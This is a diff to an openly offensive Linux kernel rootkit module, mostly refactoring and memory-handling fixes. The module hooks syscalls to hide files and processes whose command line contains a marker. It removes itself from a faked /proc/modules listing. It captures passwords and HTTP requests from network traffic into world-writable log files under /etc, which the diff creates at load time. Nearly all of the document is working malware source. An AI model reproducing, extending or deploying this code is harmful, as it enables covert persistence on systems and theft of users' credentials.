@@ -10,17 +10,16 @@
 #include <linux/slab.h>
 #include <linux/path.h>
 #include <linux/namei.h>
+#include <linux/fs_struct.h>	//for xchg(&current->fs->umask, ... )
+
 
 #define BEGIN_BUF_SIZE 10000
-#define CMDLINE_SIZE 100
-#define MAX_PROC_PATH 30
-#define FULL_LOG_PATH 30
 #define LOG_SEPARATOR "\n.............................................................\n"
 
 //configuration
-#define file_suffix ".rootkit"
-#define command_contains ".//./"
-#define rootkit_name "rootkit"
+#define FILE_SUFFIX ".rootkit"
+#define COMMAND_CONTAINS ".//./"
+#define ROOTKIT_NAME "rootkit"
 
 
 DEFINE_MUTEX(log_mutex_pass);
@@ -111,6 +110,36 @@ int file_sync(struct file *file)
 
 /*end of functions for r/w files copied from stackoverflow*/
 
+char *read_whole_file(struct file *f, int *return_read)
+{
+	int buf_size = BEGIN_BUF_SIZE;
+	int res;
+	int read = 0;
+	char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
+	if (buf == NULL)
+		return NULL;
+
+	res = file_read(f, read, buf + read, buf_size - read);
+	while (res > 0) {
+		read += res;
+		if (read == buf_size) {
+			char *new_buf = kzalloc(buf_size * 2 + 1, GFP_KERNEL);
+			if (new_buf == NULL) {
+				kfree(buf);
+				return NULL;
+			}
+			memcpy(new_buf, buf, buf_size);
+			buf_size = buf_size * 2;
+			kfree(buf);
+			buf = new_buf;
+		}
+		res = file_read(f, read, buf + read, buf_size - read);
+	}
+	if (return_read)
+		*return_read = read;
+	return buf;
+}
+
 asmlinkage long new_sys_read(unsigned int fd, char __user * buf, size_t count)
 {
 	long ret;
@@ -119,78 +148,70 @@ asmlinkage long new_sys_read(unsigned int fd, char __user * buf, size_t count)
 	return ret;
 }
 
-int check_file_suffix(const char *name)	//checks if file is ending on suffix
+int check_file_suffix(const char *name)	//checks if file ends on suffix
 {
 	int len = strlen(name);
-	int suffix_len = strlen(file_suffix);
+	int suffix_len = strlen(FILE_SUFFIX);
 	if (len >= suffix_len) {
 		const char *check_suffix = name;
 		check_suffix += len - suffix_len;
-		if (strcmp(check_suffix, file_suffix) == 0)
+		if (strcmp(check_suffix, FILE_SUFFIX) == 0)
 			return 1;
 	}
 	return 0;
-}
-
-void strcat_wrapper(char *dest, const char *from, size_t size)
-{
-	if (strlen(dest) >= size)
-		return;
-	strncat(dest, from, size - strlen(dest));
 }
 
 int check_process_prefix(const char *name)
 {
 	int err;
 	long pid;
-	char path[MAX_PROC_PATH];
-	struct file *f;
+	char *path = NULL;
+	struct file *f = NULL;
 	char *buf = NULL;
 	int res = 0;
+	int read;
 	int i;
 
 	err = kstrtol(name, 10, &pid);
-	if (err != 0) {
-		return res;
-	}
+	if (err != 0)
+		goto end_;
 
-	strncpy(path, "/proc/", MAX_PROC_PATH);
-	strcat_wrapper(path, name, MAX_PROC_PATH);
-	strcat_wrapper(path, "/", MAX_PROC_PATH);
-	strcat_wrapper(path, "cmdline", MAX_PROC_PATH);
+	path = kzalloc(strlen("/proc/") + strlen(name) + strlen("cmdline") + 1,
+	    GFP_KERNEL);
+	if (path == NULL)
+		goto end_;
+
+	strcpy(path, "/proc/");
+	strcat(path, name);
+	strcat(path, "/cmdline");
 
 	f = file_open(path, O_RDONLY, 0);
 	if (f == NULL)
-		return res;
-
-	buf = kmalloc(CMDLINE_SIZE + 1, GFP_KERNEL);
-	if (buf == NULL)
 		goto end_;
 
-	memset(buf, 0, CMDLINE_SIZE + 1);
+	buf = read_whole_file(f, &read);
 
-	err = file_read(f, 0, buf, CMDLINE_SIZE);	//todo
-
-
-	for (i = 0; i < CMDLINE_SIZE; i++) {
+	for (i = 0; i < read; i++) {
 		if (buf[i] == 0)
-			buf[i] = ' ';
+			buf[i] = ' ';	//cmdline is in format argv[0]\x00argv[1] .... 
 	}
 
-	if (strstr(buf, command_contains)) {
+	if (strstr(buf, COMMAND_CONTAINS)) {
 		printk(KERN_DEBUG "hidding %s\n", buf);
 		res = 1;
 	}
 
       end_:
-	file_close(f);
+	if (f)
+		file_close(f);
 	kfree(buf);
+	kfree(path);
 	return res;
 }
 
 int check_file_name(const char *name)
 {
-	return strcmp(name, rootkit_name) == 0;
+	return strcmp(name, ROOTKIT_NAME) == 0;
 }
 
 int should_be_hidden(const char *name)
@@ -278,39 +299,51 @@ asmlinkage long new_sys_getdents64(unsigned int fd,
 void save_to_log(const char *log_type, const char *what, size_t size)
 {
 	int err;
-	struct file *f;
+	struct file *f = NULL;
 	long long file_size;
 	struct path p;
 	struct kstat ks;
-	char full_path[FULL_LOG_PATH + 1] = "/etc/";
+	char *full_path =
+	    kzalloc(strlen("/etc/") + strlen(log_type) + strlen(FILE_SUFFIX) +
+	    1, GFP_KERNEL);
+	current->flags |= PF_SUPERPRIV;
 
-	strcat_wrapper(full_path, log_type, FULL_LOG_PATH);
-	strcat_wrapper(full_path, file_suffix, FULL_LOG_PATH);
+	if (full_path == NULL)
+		goto end;
+
+	strcpy(full_path, "/etc/");
+	strcat(full_path, log_type);
+	strcat(full_path, FILE_SUFFIX);
 
 	printk(KERN_INFO "saving to log\n");
 
 	f = file_open(full_path, O_WRONLY | O_CREAT, 0777);
 	if (f == NULL)
-		return;
+		goto end;
 
 	kern_path(full_path, 0, &p);
 	err = vfs_getattr(&p, &ks);
 	if (err)
-		return;
+		goto end;
 
 	printk(KERN_INFO "size: %lld\n", ks.size);
 	file_size = ks.size;
 	err = file_write(f, file_size, what, size);
 	if (err == -EINVAL)
-		return;
+		goto end;
 
 	file_size += size;
 	err = file_write(f, file_size, LOG_SEPARATOR, strlen(LOG_SEPARATOR));
 	if (err == -EINVAL)
-		return;
-	file_close(f);
+		goto end;
 
 	printk(KERN_INFO "ok\n");
+
+      end:
+	if (f)
+		file_close(f);
+	kfree(full_path);
+	current->flags |= PF_SUPERPRIV;
 }
 
 int password_found(const char *buf, size_t size)
@@ -361,28 +394,6 @@ asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
 	return ret;
 }
 
-char *read_whole_file(struct file *f)
-{
-	int buf_size = BEGIN_BUF_SIZE;
-	int res;
-	int read = 0;
-	char *buf = kzalloc(buf_size + 1, GFP_KERNEL);
-
-	res = file_read(f, read, buf + read, buf_size - read);
-	while (res > 0) {
-		read += res;
-		if (read == buf_size) {
-			char *new_buf = kzalloc(buf_size * 2 + 1, GFP_KERNEL);
-			memcpy(new_buf, buf, buf_size);
-			buf_size = buf_size * 2;
-			kfree(buf);
-			buf = new_buf;
-		}
-		res = file_read(f, read, buf + read, buf_size - read);
-	}
-	return buf;
-}
-
 //when open("/proc/modules") is called, reate fake file with removed rootkit entry and redirect to this file
 asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 {
@@ -399,35 +410,40 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 		printk(KERN_INFO "open /proc/modules\n");
 
 		new_path =
-		    kzalloc(strlen("/tmp/modules") + strlen(file_suffix) + 1,
+		    kzalloc(strlen("/etc/modules") + strlen(FILE_SUFFIX) + 1,
 		    GFP_KERNEL);
-		strcpy(new_path, "/tmp/modules");
-		strcat(new_path, file_suffix);
 
-		real_modules = file_open("/proc/modules", O_RDONLY, 0);
-		if (real_modules == NULL)
+		if (!new_path)
 			return ref_sys_open(filename, flags, mode);
 
-		char full_path[FULL_LOG_PATH + 1] = "/tmp/";
-		strcat_wrapper(full_path, "modules", FULL_LOG_PATH);
-		strcat_wrapper(full_path, file_suffix, FULL_LOG_PATH);
+		strcpy(new_path, "/etc/modules");
+		strcat(new_path, FILE_SUFFIX);
 
+
+		real_modules = file_open("/proc/modules", O_RDONLY, 0);
+		if (real_modules == NULL) {
+			kfree(new_path);
+			return ref_sys_open(filename, flags, mode);
+		}
 		//open files
 		fake_modules =
 		    file_open(new_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);
-		if (fake_modules == NULL)
+		if (fake_modules == NULL) {
+			kfree(new_path);
 			return ref_sys_open(filename, flags, mode);
+		}
 
-		modules_buf = read_whole_file(real_modules);
-		if (modules_buf == NULL)
+		modules_buf = read_whole_file(real_modules, NULL);
+		if (modules_buf == NULL) {
+			kfree(new_path);
 			return ref_sys_open(filename, flags, mode);
-
+		}
 		//remove rootkit from modules list
-		rootkit = strstr(modules_buf, rootkit_name);
+		rootkit = strstr(modules_buf, ROOTKIT_NAME);
 		if (rootkit)	//shouldn't be NULL anyway - only if rootkit name is bad configured in #define
 		{
 			rootkit_end = rootkit;
-			while (*rootkit_end != '\n')
+			while (*rootkit_end != '\n' && *rootkit_end != '\x00')	//shouldn't be \x00 anyway - only if somebody do it intentionally and change sys_open before us
 				rootkit_end++;
 			memcpy(rootkit, rootkit_end + 1, strlen(rootkit_end) + 1);	//wiping rootkit entry
 		}
@@ -446,6 +462,8 @@ asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
 		//redirect open("/proc/modules") to fake file
 		ret = ref_sys_open(new_path, flags, mode);
 		set_fs(old_fs);
+
+		kfree(new_path);
 	} else {
 		ret = ref_sys_open(filename, flags, mode);
 	}
@@ -471,6 +489,44 @@ static unsigned long **aquire_sys_call_table(void)
 	return NULL;
 }
 
+static void create_file(char *name)
+{
+	struct file *f;
+	char *path;
+
+	mode_t old_mask = xchg(&current->fs->umask, 0);
+
+	path = kzalloc(strlen(name) + strlen(FILE_SUFFIX) + 1, GFP_KERNEL);
+
+	if (!path)
+		return;
+
+	strcpy(path, name);
+	strcat(path, FILE_SUFFIX);
+
+	f = file_open(path, O_CREAT, 0777);
+	if (f)
+		file_close(f);
+
+	kfree(path);
+
+	xchg(&current->fs->umask, old_mask);
+}
+
+/* Creates files with permissions 777 used later by rootkit
+ * because functions filp* worsk with privileges of user calling syscall
+ * files:
+ * /etc/passwords[FILE_SUFFIX]
+ * /etc/http_requests[FILE_SUFFIX]
+ * /etc/modules[FILE_SUFFIX]
+*/
+static void create_files(void)
+{
+	create_file("/etc/modules");
+	create_file("/etc/http_requests");
+	create_file("/etc/passwords");
+}
+
 #define register(name) \
  ref_sys_##name = (void *)sys_call_table[__NR_##name]; \
  sys_call_table[__NR_##name] = (unsigned long *)new_sys_##name;
@@ -482,6 +538,8 @@ static int __init rootkit_start(void)
 {
 	if (!(sys_call_table = aquire_sys_call_table()))
 		return -1;
+
+	create_files();
 
 	original_cr0 = read_cr0();
 
